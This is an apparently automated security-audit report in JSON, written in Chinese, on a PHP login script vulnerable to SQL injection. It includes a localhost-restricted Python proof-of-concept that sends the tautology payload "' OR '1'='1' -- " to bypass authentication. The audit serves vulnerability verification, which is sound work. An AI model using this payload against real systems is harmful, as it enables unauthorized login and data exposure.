@@ -1,0 +1,135 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-002",
+  "input_version": "v2",
+  "prompt_version": "v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-002"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "第8-9行读取的 POST 参数在第16行以单引号值上下文直接拼接，第17行 mysql_query 立即执行，第19-27行回显查询结果；全路径静态可见，且片段内没有任何参数化、转义或白名单。连接文件与运行版本未提供，只影响部署成立条件，不改变拼接事实。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-002-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$uname=$_POST['uname'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 9,
+          "line_end": 9,
+          "quote": "$passwd=$_POST['passwd'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 38,
+          "line_end": 38,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "第6行仅在 isset 后进入处理逻辑，第8-9行直接把 $_POST['uname'] 与 $_POST['passwd'] 赋给局部变量，未见 trim、类型检查、白名单或转义。",
+        "第12-13行把两个原值写入 result.txt，这是并行的日志路径，不改变后续 SQL 字符串。",
+        "第16行以单引号包裹的值上下文把 $uname、$passwd 直接插值进 SELECT 语句，构造 username='...' and password='...' 的查询文本。",
+        "第17行调用 mysql_query($sql) 执行拼接后的字符串；第18行用 mysql_fetch_array 取行，未见预处理语句、占位符或 mysql_real_escape_string 等转义。",
+        "第19-33行在取到行时回显 username、password；第35-44行在无行时第38行回显 mysql_error()，可作为差异观察点，但不作为注入成立的必要条件。"
+      ],
+      "principle": "用户可控的 uname、passwd 以字符串拼接方式进入单引号值上下文，随后由 mysql_query 执行；攻击者可在值中闭合引号并改变 WHERE 条件或追加 SQL 片段，从而改变查询语义。",
+      "impact": "可能绕过登录条件并返回 users 表中本不应由当前输入匹配的行，进而在页面回显用户名和口令；影响范围限于该查询可达的数据库对象与权限，实际影响取决于未提供的连接配置与数据库权限。",
+      "preconditions": [
+        "目标部署可访问到本顶层请求处理脚本，且 POST 请求能够到达第6行的 isset 分支。",
+        "运行环境提供 mysql_* 接口（PHP 5.x 且启用 mysql 扩展），否则第17行会因函数不存在而失败。",
+        "数据库连接文件成功建立连接，users 表可被查询，且当前数据库用户具有 SELECT 权限。",
+        "部署层或前置代码未对 uname/passwd 做白名单、转义或 WAF 拦截；本片段内不存在此类防护，但上游是否部署未知。"
+      ],
+      "counterexamples": [
+        "若前置网关或框架对单引号、注释符等做严格白名单过滤，恶意输入可能无法到达第16行的拼接点。",
+        "若实际部署的是 PHP 7 及以上且未提供 mysql 兼容层，第17行无法执行，该路径不成立（属于环境不兼容，不等同于安全）。",
+        "若 include 的连接文件在建立连接时设置了会阻止多语句或特定语法的配置，影响可利用形式，但不消除值拼接本身。",
+        "若第16行之前被部署层替换为参数化实现，则本片段结论不适用；当前提供的代码中未见该替换。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"SQLI-002 本地授权靶场 SQL 注入验证草案（需人工适配）。\n\n仅允许 localhost / 127.0.0.1 / ::1；拒绝跟随重定向；不打印响应正文与凭据。\n请求参数名 uname、passwd 来自被审计代码；登录处理路径未提供，需用 --path 指定。\n\"\"\"\nimport argparse\nimport hashlib\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nSUCCESS_MARKER = b\"Your Login name:\"\nFAILURE_MARKER = b\"slap.jpg\"\nERROR_MARKERS = (\n    b\"You have an error in your SQL syntax\",\n    b\"mysql_fetch_array\",\n    b\"mysql_query\",\n    b\"Fatal error\",\n    b\"Parse error\",\n    b\"Warning:\",\n)\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(\n            req.full_url, code, \"redirect blocked: %s\" % newurl, headers, fp\n        )\n\n\ndef check_target(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"拒绝：仅允许 http/https，收到 %r\" % parts.scheme)\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"拒绝：仅允许本地主机，收到 %r\" % parts.hostname)\n    return url\n\n\ndef load_cookie(path):\n    if not path:\n        return None\n    with open(path, \"r\", encoding=\"utf-8\") as fh:\n        for line in fh:\n            line = line.strip()\n            if line.lower().startswith(\"cookie:\"):\n                return line.split(\":\", 1)[1].strip()\n    raise SystemExit(\"会话文件缺少 'Cookie:' 行：%s\" % path)\n\n\ndef send(opener, url, user_value, pass_value, cookie, timeout):\n    payload = urllib.parse.urlencode(\n        {\"uname\": user_value, \"passwd\": pass_value}\n    ).encode(\"utf-8\")\n    headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n    if cookie:\n        headers[\"Cookie\"] = cookie\n    request = urllib.request.Request(url, data=payload, headers=headers, method=\"POST\")\n    try:\n        with opener.open(request, timeout=timeout) as response:\n            return {\"status\": response.status, \"body\": response.read(), \"error\": None}\n    except urllib.error.HTTPError as exc:\n        return {\"status\": exc.code, \"body\": b\"\", \"error\": \"HTTPError\"}\n    except urllib.error.URLError as exc:\n        return {\"status\": None, \"body\": b\"\", \"error\": \"URLError: %s\" % exc.reason}\n    except (TimeoutError, ConnectionError) as exc:\n        return {\"status\": None, \"body\": b\"\", \"error\": \"%s: %s\" % (type(exc).__name__, exc)}\n\n\ndef summarize(label, result):\n    body = result[\"body\"]\n    markers = {\n        \"login_row\": SUCCESS_MARKER in body,\n        \"failure_image\": FAILURE_MARKER in body,\n        \"sql_or_php_error\": any(marker in body for marker in ERROR_MARKERS),\n    }\n    digest = hashlib.sha256(body).hexdigest()[:12] if body else \"-\"\n    print(\"[%s] status=%s error=%s bytes=%d sha256_12=%s %s\" % (\n        label, result[\"status\"], result[\"error\"], len(body), digest,\n        \" \".join(\"%s=%s\" % (k, v) for k, v in markers.items()),\n    ))\n    return markers\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"SQLI-002 本地 SQL 注入验证草案\")\n    parser.add_argument(\"--base-url\", default=\"http://127.0.0.1\", help=\"靶场基址\")\n    parser.add_argument(\"--path\", required=True, help=\"目标处理脚本路径，例如 /sqli/SQLI-002.php\")\n    parser.add_argument(\"--normal-user\", default=\"lab_normal_user\", help=\"基线专用测试账号名\")\n    parser.add_argument(\"--normal-pass\", default=\"lab_normal_pass\", help=\"基线专用测试口令\")\n    parser.add_argument(\"--session-file\", default=None, help=\"本地会话文件，含 'Cookie: <value>' 行\")\n    parser.add_argument(\"--timeout\", type=float, default=10.0, help=\"单次请求超时秒数\")\n    args = parser.parse_args()\n\n    url = check_target(args.base_url.rstrip(\"/\") + \"/\" + args.path.lstrip(\"/\"))\n    cookie = load_cookie(args.session_file)\n    opener = urllib.request.build_opener(NoRedirect)\n\n    baseline = send(opener, url, args.normal_user, args.normal_pass, cookie, args.timeout)\n    base_markers = summarize(\"baseline\", baseline)\n\n    syntax = send(opener, url, \"lab_probe'\", \"lab_probe\", cookie, args.timeout)\n    syntax_markers = summarize(\"syntax-probe\", syntax)\n\n    bypass = send(opener, url, \"lab_probe' OR '1'='1' -- \", \"lab_probe\", cookie, args.timeout)\n    bypass_markers = summarize(\"tautology-probe\", bypass)\n\n    print()\n    if baseline[\"error\"] or syntax[\"error\"] or bypass[\"error\"]:\n        print(\"结论：请求未全部完成（连接/协议/重定向错误），本次未获得可比较证据。\")\n        return 2\n    if base_markers[\"login_row\"]:\n        print(\"结论：基线使用了有效账号，不能作为未认证对照；请换用无效测试口令后重跑。\")\n        return 3\n    if bypass_markers[\"login_row\"] and not base_markers[\"login_row\"]:\n        print(\"观察：基线未返回用户行，恒真输入返回用户行，符合字符串拼接导致认证绕过的特征；\")\n        print(\"仍需人工核查响应内容、服务器日志与代码行 16-17，不能仅凭本脚本断定漏洞成立。\")\n        return 0\n    print(\"观察：未出现预期的行返回差异；可能是防护、路径错误、接口不兼容或条件不满足。\")\n    print(\"语法探针 sql_or_php_error=%s，仅作线索，不单独证明注入。\" % syntax_markers[\"sql_or_php_error\"])\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库 argparse、hashlib、urllib、sys",
+          "目标靶场需运行 PHP 5.x 并启用 mysql 扩展以支持 mysql_query/mysql_fetch_array",
+          "需要已部署实例的实际处理路径与可访问的本地服务"
+        ],
+        "parameters": [
+          "--base-url：靶场基址，默认 http://127.0.0.1，脚本仅接受 localhost、127.0.0.1、::1",
+          "--path：必填，目标处理脚本路径；代码片段未给出 URL 路径，需人工按实际部署填写",
+          "--normal-user / --normal-pass：基线专用无效测试账号，默认 lab_normal_user / lab_normal_pass，不使用真实凭据",
+          "--session-file：可选，本地文件中的一行 'Cookie: <value>'，用于需要会话的场景，内容不打印",
+          "--timeout：单次请求超时秒数，默认 10 秒"
+        ],
+        "steps": [
+          "在授权本地靶场部署与片段一致的 PHP 代码及 sql-connections/sql-connect.php，准备专用测试账号或确认基线口令无效。",
+          "运行 python poc_sqli002.py --base-url http://127.0.0.1 --path <实际路径>；如流程需要会话，追加 --session-file <本地Cookie文件>。",
+          "脚本先发送基线请求（无效测试账号），再发送单引号语法探针，最后发送恒真测试输入，仅输出状态码、长度、摘要和标记布尔值。",
+          "对比三次响应：基线应为未返回行；语法探针可用于观察 SQL 错误迹象；恒真输入若返回 'Your Login name:' 行，记录为差异证据。",
+          "人工复核响应正文、服务器日志和代码行 16-17，保存请求与响应截图为工作包4证据；测试后无需修改数据。"
+        ],
+        "expected_observation": "若拼接可被利用：基线请求无 'Your Login name:' 标记（通常出现 slap.jpg），单引号探针可能出现 SQL 语法错误文本或警告，恒真输入在未提供有效口令时返回 'Your Login name:' 及 users 行内容。若存在防护、路径错误或接口不兼容，则三次响应均无该差异，或出现连接错误、认证跳转、PHP 致命错误。",
+        "success_criteria": "在相同基址、路径、会话与参数名条件下，仅改变 uname 的值：基线请求未返回用户行，而恒真输入返回包含 'Your Login name:' 的行，且响应中无 PHP 致命/解析错误、无认证重定向、无 'You have an error in your SQL syntax' 等仅由语法探针造成的干扰；同时服务器日志显示同一处理路径的查询行为变化。满足这些对照才可作为注入证据；缺一不可，且需工作包3按条件复核。",
+        "limitations": [
+          "未实际运行；仅对 POC 文本做 Python 语法解析检查，未发送任何请求，execution_status 为未运行。",
+          "代码片段未提供实际 URL 路径、连接文件内容、PHP/数据库版本与会话要求，--path 与会话文件必须人工适配。",
+          "恒真输入依赖 MySQL 的 '-- ' 注释语法；若数据库或 SQL 模式不同，需人工调整测试输入。",
+          "脚本只发送三次只读查询请求，不枚举数据库、不导出数据、不修改记录；成功标记只能说明返回了用户行，不能替代对查询语义的人工核验。",
+          "未提供认证前置流程与 CSRF/token 要求；若目标要求登录或 token，需补充对应参数后重跑。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "sql-connections/sql-connect.php 未提供，无法确认连接字符集、SQL 模式、错误处理与 mysql_* 兼容层。",
+    "实际部署的 PHP 与 MySQL 版本未知；mysql_* 在 PHP 7+ 已移除，需要确认运行环境。",
+    "实际 URL 路径、Web 服务器配置、认证前置流程与是否需要 CSRF/token 未知。",
+    "部署层是否存在反向代理、WAF 或框架级输入过滤未知。",
+    "数据库用户权限、users 表数据与是否允许多语句未知。"
+  ],
+  "risk_notes": [
+    "第12-13行把用户名和口令明文写入 result.txt，属于凭据落盘风险，不在本次 SQL 注入判定范围内。",
+    "第25-27行把数据库返回的用户名和口令直接回显，可能构成敏感信息泄露或反射型 XSS，属于范围外风险。",
+    "第38行 print_r(mysql_error()) 会向客户端泄露数据库错误信息，可作为辅助观察点，但不单独构成 SQL 注入。"
+  ],
+  "quality_notes": [
+    "使用已过时并在 PHP 7 移除的 mysql_* 接口，且未使用预处理语句。",
+    "error_reporting(0) 与 @ 抑制错误，同时失败分支又输出 mysql_error()，错误处理策略不一致。",
+    "缺少 CSRF 防护、输入长度限制与登录失败速率限制。"
+  ],
+  "limitations": [
+    "本次仅基于单个标准化代码块做静态分析，未运行目标，也未获得原始文件行号映射。",
+    "所有行号均为该代码块内 1 起始的局部行号，不是原始文件行号。",
+    "无法确认部署环境是否满足 mysql_* 运行条件，也无法确认上游是否存在过滤。",
+    "未验证恒真输入在真实数据库与 SQL 模式下的具体响应，POC 为需人工适配的草案。"
+  ],
+  "runtime_evidence": []
+}
